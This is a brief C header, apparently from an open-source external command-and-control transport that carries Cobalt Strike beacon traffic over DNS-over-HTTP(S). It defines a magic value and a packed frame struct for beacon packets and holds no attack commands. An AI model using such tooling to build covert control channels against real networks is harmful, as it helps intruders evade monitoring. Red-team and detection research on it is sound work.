/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

#define BEACON_PKT_MAGIC	0x0000beef
#define BEACON_PKT_MINLENGTH	8

typedef struct __attribute__((packed, scalar_storage_order("big-endian")))
{
	ULONG uMagic;
	ULONG Length;
	UCHAR Buffer[0];
} BEACON_PKT_FRAME, *PBEACON_PKT_FRAME;
